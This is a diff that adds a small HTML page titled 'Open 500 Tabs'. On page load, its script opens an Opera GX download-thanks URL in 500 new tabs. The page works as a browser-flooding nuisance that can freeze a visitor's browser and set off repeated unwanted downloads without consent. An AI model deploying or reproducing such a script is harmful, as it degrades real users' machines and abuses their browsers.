@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Open 500 Tabs</title>
+  <script>
+    // 페이지가 로드되었을 때 실행
+    window.onload = function () {
+      const url = "https://www.opera.com/ko/computer/thanks?ni=eapgx&os=windows&edition=GX-CN"; // https://www.opera.com/ko/computer/thanks?ni=eapgx&os=windows&edition=GX-CN
+      for (let i = 0; i < 500; i++) {
+        window.open(url, "_blank");
+      }
+    };
+  </script>
+</head>
+<body>
+  <h1>Opening 500 Tabs...</h1>
+  <p>If the tabs do not open, your browser may be blocking pop-ups.</p>
+</body>
+</html>
